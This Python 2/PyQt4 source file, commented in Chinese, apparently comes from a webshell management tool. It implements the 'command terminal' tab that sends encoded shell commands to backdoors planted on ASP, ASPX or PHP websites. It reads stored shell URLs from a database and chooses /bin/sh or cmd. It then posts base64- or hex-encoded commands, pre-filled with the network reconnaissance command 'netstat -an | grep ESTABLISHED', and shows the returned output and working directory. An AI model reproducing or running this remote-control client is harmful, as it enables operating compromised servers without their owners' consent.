#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#终端操作
from PyQt4 import uic
from PyQt4 import QtCore, QtGui ,QtNetwork
from PyQt4.QtCore import pyqtSlot
from PyQt4.QtCore import *
from ctypes import *
from PyQt4.QtGui import *
import socket
socket.setdefaulttimeout(10)

import sys
reload(sys)
sys.setdefaultencoding("utf-8")

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    _fromUtf8 = lambda s: s

from ui import tabWidget_close_lock,UIManager
from Db_Model import db_shell #常用数据库操作
from Clicked_Controller import ip_query #显示IP地址
from Clicked_Controller import link_shell  #链接SHELL等操作
from Clicked_Controller import eval_link  #链接SHELL
from Clicked_Controller import ShowFileManage_class  #文件管理事件响应
from Clicked_Controller import threadpool #线程操作
from Clicked_Controller import g #公共文件
from Clicked_Controller import msg #消息提示
from Clicked_Controller import log #日志记录

import link_except_ui   #错误异常处理
import base64
import binascii
import urllib

class Worker_Thread(QThread):
    Finish = pyqtSignal() #basestring
    Finish1 = pyqtSignal(basestring) #
    Finish2 = pyqtSignal(basestring,basestring) #

    def __init__(self,**kwargs):
        super(Worker_Thread,self).__init__()
        if "name" in kwargs:  #名称
            self.name=str((kwargs['name']))
            #print "xxx",self.name
        if "var1" in kwargs:  #变量1
            self.var1=str((kwargs['var1']))
            #print "xxx",self.var1
        if "var2" in kwargs:  #变量2
            self.var2=str((kwargs['var2']))
            #print "xxx",self.var2

    def run(self):
        try:
            if self.name=="uix0":   #无参数
                self.Finish.emit()
                #self.treeWidget.doubleClicked.connect(self.double_click)  #目录查看数据  双击
            if self.name=="uix1":   #1个无参数
                self.Finish1.emit(self.var1)
            if self.name=="uix2":   #2个无参数
                self.Finish2.emit(self.var1,self.var2)
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))
            #print(str(e))

class ShowcmdManage_ui(QWidget):
    def __init__(self,**kwargs):
        super(ShowcmdManage_ui, self).__init__()
        #uic.loadUi("ui/file.ui", self)
        self.main_ui=UIManager.get_ui('main_ui') #主程序UI
        self.shell_sql=UIManager.shell_sql
        self.ShowFile_ui = uic.loadUi("ui/ShowcmdManage.ui", self)#动态加标签
        ###########################################
        try:
            self.id_shell_list=db_shell.id_sitetable_shell('%s'%(kwargs['ID']))  #通过ID查询SHELL的状态
            self.id=str(self.id_shell_list[0])         #自动编号
            #self.type_id=str(self.id_shell_list[1])    #      类别
            self.siteurl=str(self.id_shell_list[2])    #    网址
            #self.sitepass=str(self.id_shell_list[3])   #    密码
            #self.link=str(self.id_shell_list[4])         #链接状态
            #self.ip=str(self.id_shell_list[5])         #    ip地址
            #self.config=str(self.id_shell_list[6])     #    配置
            #self.coding=str(self.id_shell_list[7])     #  编码方式
            self.script=str(self.id_shell_list[8])      #   asp   php

            self.parameter_0.setMouseTracking(False)
            self.parameter_0.setAcceptDrops(False)
            self.parameter_0.setEditable(True)
            self.parameter_0.setMaxVisibleItems(15)#设置下拉最大选项数为15
            self.parameter_0.installEventFilter(self)#在窗体上为self.edit安装过滤器
            ###########################################
            self.pushButton.clicked.connect(self.link_cms_shell_Thread)    #shell命令
            #self.parameter_0.textChanged.connect(self.GetExt)  #输入命令
            ###########################################
            self.cmd_shell_TextEdit.setStyleSheet("color:rgb(245,245,245)") #文本颜色
            self.cmd_shell_TextEdit.setStyleSheet("background-color:rgb(192,192,192)") #背景色
            #lineEdit.setFont(QFont( "Timers" , 28 ,  QFont::Bold) ) #设置字体和大小
            self.shell_path="" #SHELL路径
            #self.shell_win_linux="" #操作系统
            self.cmd_data="" #显示数据
            #名称
            name_Title=u"%s"%(ip_query.url_www(str(self.siteurl)))  #_fromUtf8("文件管理-" + str(QTableName))
            self.main_ui.tabWidget.addTab(self.ShowFile_ui,QIcon('system/ShowcmdManage.ico'),name_Title)

            if "form" in kwargs:  #名称
                if int(kwargs['form']):
                    self.main_ui.tabWidget.setCurrentIndex(self.main_ui.tabWidget.count()-1)#显示当前页

            self.ini_run_Thread() #类初始化线程
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

    def ini_run_Thread(self): #类初始化线程
        try:
            self.work = Worker_Thread(name="uix0")
            self.work.Finish.connect(self.ini_run)
            self.work.start()
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

    def ini_run(self):   #类初始化
        try:
            if self.script=="PHP":
                psot_data=link_shell.GetPostText(self.script,"WebRoot")    #获取代码
                psot_data=link_shell.post_php_data(psot_data)  #转换代码
            if self.script=="ASP":
                psot_data=link_shell.GetPostText(self.script,"WebRoot")    #获取代码
            if self.script=="ASPX":
                psot_data=link_shell.GetPostText(self.script,"WebRoot")    #获取代码
            FALSE_bool,Info=eval_link.Post_eval_php(str(self.id),psot_data) #获取 请求内容
            if FALSE_bool==0:
                db_shell.SELECT_shell_link(str(self.id),0) #更新链接状态  0链接失败 1链接成功  2还未测试
                #print u"提示SHELL链接不成功    应该返回不成功内容",Info
                self.link_except=link_except_ui.link_except_ui()#错误提示窗口
                self.link_except.set_data(title=u'链接错误',except_data=Info)
                self.link_except.show()
                self.link_except.form_close.connect(self.ShowFileManage_data.tab_close_Thread)  #响应update_shell事件
                return
            else:
                Rpath = Info.split('\t')  #分割返回的信息
                self.shell_path=_fromUtf8(str(Rpath[0])) # .replace("/","\\")+"\\"
                if self.shell_path[0:1]=="/" or self.shell_path[0:1]=="\\":#判断是不是linux
                    #self.shell_win_linux="linux" #操作系统
                    self.parameter_1.setText(_fromUtf8(str("/bin/sh")))  #.text读取  .setText写入
                    #&z2=cd "/home/htdocs/caches/caches_linkage/caches_data/";netstat -an | grep ESTABLISHED;echo [S];pwd;echo [E]
                    self.parameter_2.setText(_fromUtf8(str("cd \"%s\""%(g.GetExt(self.shell_path)))))  #.text读取  .setText写入
                    #self.parameter_0.setText(_fromUtf8(str("netstat -an | grep ESTABLISHED")))  #.text读取  .setText写入
                    self.parameter_0.setEditText(_fromUtf8(str("netstat -an | grep ESTABLISHED")))  #设置当前内容
                    self.parameter_0.addItem(_fromUtf8(str("netstat -an | grep ESTABLISHED")))  #添加到下拉列表
                    self.cmd_shell_TextEdit.setPlainText(g.GetExt(self.shell_path))
                else:
                    #self.shell_win_linux="win" #操作系统
                    self.parameter_1.setText(_fromUtf8(str("cmd")))  #
                    self.parameter_2.setText(_fromUtf8(str("cd /d \""+g.GetExt(self.shell_path)+"\"")))  #
                    #self.parameter_0.setText(_fromUtf8(str("netstat -an | find \"ESTABLISHED\"")))  #
                    self.parameter_0.setEditText(_fromUtf8(str("netstat -an | find \"ESTABLISHED\"")))  #设置当前内容
                    self.parameter_0.addItem(_fromUtf8(str("netstat -an | find \"ESTABLISHED\"")))  #添加到下拉列表
                    self.cmd_shell_TextEdit.setPlainText(g.GetExt(self.shell_path))
            self.cmd_data=self.cmd_shell_TextEdit.toPlainText() #显示数据
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

    def eventFilter(self, source, event):  #事件监听
        try:
            #PyQt4.QtCore.QEvent.KeyPress
            #PyQt4.QtCore.QEvent.KeyRelease
            if event.type()==QtCore.QEvent.KeyPress:   #检测键盘事件
                if event.key()==QtCore.Qt.Key_Return:  #判断回车
                    #回车是16777220
                    self.link_cms_shell_Thread()  #执行事件
            return QtGui.QWidget.eventFilter(self, source, event)#将事件交给上层对话框
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))


    # def GetExt(self):  #输入命令
    #     #self.cmd_shell_TextEdit.toPlainText()
    #     data="%s%s"%(self.cmd_data,self.parameter_0.text())
    #     self.cmd_shell_TextEdit.setPlainText(data)

    def link_cms_shell_Thread(self):    #shell命令
        try:
            self.work = Worker_Thread(name="uix0")
            self.work.Finish.connect(self.link_cms_shell)
            self.work.start()
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

    def link_cms_shell(self):    #shell命令
        try:
            if self.script=="ASPX":
                psot_data=link_shell.GetPostText(self.script,"Cmd_shell")    #shell 命令
                z1=str(self.parameter_1.text())
                z2="%s&%s&echo [S]&cd&echo [E]"%(str(self.parameter_2.text()),str(self.parameter_0.currentText()))
                psot_data="%s&z1=%s&z2=%s"% \
                          (psot_data,urllib.quote(base64.b64encode(str(z1))),urllib.quote(base64.b64encode(str(z2))))
                FALSE_bool,Info=eval_link.Post_eval_php(str(self.id),psot_data) #获取 请求内容
                if FALSE_bool==0:
                    msg.msg_lower_Left(u"%s 命令失败"%(str(self.siteurl)))#设置状态栏文字信息
                else:
                    Info=Info.replace("[S]","|")
                    Info=Info.replace("[E]","|")
                    Rpath = Info.split('|')  #分割返回的信息
                    if len(Rpath)>1:
                        data="%s%s\n  %s\n%s"% \
                             (self.cmd_data,str(self.parameter_0.currentText()),str(Rpath[0]),g.GetExt(Rpath[1]))
                        self.cmd_data=data
                        self.cmd_shell_TextEdit.setPlainText(self.cmd_data)
                        url_paths=Rpath[1].strip('\r\n')
                        url_paths=url_paths.strip('\n')
                        url_paths=url_paths.strip('\r')
                        self.parameter_2.setText(_fromUtf8(str("cd /d \""+g.GetExt(url_paths)+"\"")))  #WIN
                    else:  #错误
                        data="%s%s\n  %s\n%s"% \
                             (self.cmd_data,str(self.parameter_0.currentText()),str(Info),g.GetExt(self.shell_path))
                        self.cmd_data=data
                        self.cmd_shell_TextEdit.setPlainText(self.cmd_data)

                    self.parameter_0.addItem(_fromUtf8(str(self.parameter_0.currentText())))  #添加到下拉列表
                    msg.msg_lower_Left(u"%s 命令完成"%(str(self.siteurl)))#设置状态栏文字信息
            if self.script=="ASP":
                psot_data=link_shell.GetPostText(self.script,"Cmd_shell")    #shell 命令
                z1=str(self.parameter_1.text())
                z2="%s&%s&echo [S]&cd&echo [E]"%(str(self.parameter_2.text()),str(self.parameter_0.currentText()))
                psot_data="%s&z1=%s&z2=%s"% \
                          (psot_data,binascii.b2a_hex(str(z1)),binascii.b2a_hex(str(z2)))
                FALSE_bool,Info=eval_link.Post_eval_php(str(self.id),psot_data) #获取 请求内容
                if FALSE_bool==0:
                    msg.msg_lower_Left(u"%s 命令失败"%(str(self.siteurl)))#设置状态栏文字信息
                else:
                    Info=Info.replace("[S]","|")
                    Info=Info.replace("[E]","|")
                    Rpath = Info.split('|')  #分割返回的信息
                    if len(Rpath)>1:
                        data="%s%s\n  %s\n%s"% \
                             (self.cmd_data,str(self.parameter_0.currentText()),str(Rpath[0]),g.GetExt(Rpath[1]))
                        self.cmd_data=data
                        self.cmd_shell_TextEdit.setPlainText(self.cmd_data)
                        url_paths=Rpath[1].strip('\r\n')
                        url_paths=url_paths.strip('\n')
                        url_paths=url_paths.strip('\r')
                        self.parameter_2.setText(_fromUtf8(str("cd /d \""+g.GetExt(url_paths)+"\"")))  #WIN
                    else:  #错误
                        data="%s%s\n  %s\n%s"% \
                             (self.cmd_data,str(self.parameter_0.currentText()),str(Info),g.GetExt(self.shell_path))
                        self.cmd_data=data
                        self.cmd_shell_TextEdit.setPlainText(self.cmd_data)

                    self.parameter_0.addItem(_fromUtf8(str(self.parameter_0.currentText())))  #添加到下拉列表
                    msg.msg_lower_Left(u"%s 命令完成"%(str(self.siteurl)))#设置状态栏文字信息
            if self.script=="PHP":
                psot_data=link_shell.GetPostText(self.script,"Cmd_shell")    #shell 命令
                if self.shell_path[0:1]=="/" or self.shell_path[0:1]=="\\":#判断是不是linux
                    #linux
                    z1=str(self.parameter_1.text())
                    #&z2=cd "/home/htdocs//";netstat -an | grep ESTABLISHED;echo [S];pwd;echo [E]
                    z2="%s;%s;echo [S];pwd;echo [E]"%(str(self.parameter_2.text()),str(self.parameter_0.currentText()))
                    #z2=z2.replace("\\","/")
                    psot_data="%s&z1=%s&z2=%s"% \
                              (link_shell.post_php_data(psot_data),base64.b64encode(str(z1)),base64.b64encode(str(z2)))
                    FALSE_bool,Info=eval_link.Post_eval_php(str(self.id),psot_data) #获取 请求内容
                    if FALSE_bool==0:
                        msg.msg_lower_Left(u"%s 命令失败"%(str(self.siteurl)))#设置状态栏文字信息
                    else:
                        Info=Info.replace("[S]","|")
                        Info=Info.replace("[E]","|")
                        Rpath = Info.split('|')  #分割返回的信息
                        if len(Rpath)>1:
                            data="%s%s\n%s\n%s"% \
                                 (self.cmd_data,str(self.parameter_0.currentText()),str(Rpath[0]),g.GetExt(Rpath[1]))
                            self.cmd_data=data
                            self.cmd_shell_TextEdit.setPlainText(self.cmd_data)
                            url_paths=Rpath[1].strip('\r\n')
                            url_paths=url_paths.strip('\n')
                            url_paths=url_paths.strip('\r')
                            self.parameter_2.setText(_fromUtf8(str("cd \"%s\""%(g.GetExt(url_paths)))))  #linux
                        else: #no
                            data="%s%s\n%s\n%s"% \
                                 (self.cmd_data,str(self.parameter_0.currentText()),str(Info),g.GetExt(self.shell_path))
                            self.cmd_data=data
                            self.cmd_shell_TextEdit.setPlainText(self.cmd_data)
                        msg.msg_lower_Left(u"%s 命令完成"%(str(self.siteurl)))#设置状态栏文字信息
                else:
                    z1=str(self.parameter_1.text())
                    z2="%s&%s&echo [S]&cd&echo [E]"%(str(self.parameter_2.text()),str(self.parameter_0.currentText()))
                    psot_data="%s&z1=%s&z2=%s"% \
                          (link_shell.post_php_data(psot_data),base64.b64encode(str(z1)),base64.b64encode(str(z2)))
                    FALSE_bool,Info=eval_link.Post_eval_php(str(self.id),psot_data) #获取 请求内容
                    if FALSE_bool==0:
                        msg.msg_lower_Left(u"%s 命令失败"%(str(self.siteurl)))#设置状态栏文字信息
                    else:
                        Info=Info.replace("[S]","|")
                        Info=Info.replace("[E]","|")
                        Rpath = Info.split('|')  #分割返回的信息
                        if len(Rpath)>1:
                            data="%s%s\n  %s\n%s"% \
                                 (self.cmd_data,str(self.parameter_0.currentText()),str(Rpath[0]),g.GetExt(Rpath[1]))
                            self.cmd_data=data
                            self.cmd_shell_TextEdit.setPlainText(self.cmd_data)
                            url_paths=Rpath[1].strip('\r\n')
                            url_paths=url_paths.strip('\n')
                            url_paths=url_paths.strip('\r')
                            self.parameter_2.setText(_fromUtf8(str("cd /d \""+g.GetExt(url_paths)+"\"")))  #WIN
                        else:  #错误
                            data="%s%s\n  %s\n%s"%\
                                 (self.cmd_data,str(self.parameter_0.currentText()),str(Info),g.GetExt(self.shell_path))
                            self.cmd_data=data
                            self.cmd_shell_TextEdit.setPlainText(self.cmd_data)

                        self.parameter_0.addItem(_fromUtf8(str(self.parameter_0.currentText())))  #添加到下拉列表
                        msg.msg_lower_Left(u"%s 命令完成"%(str(self.siteurl)))#设置状态栏文字信息
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))




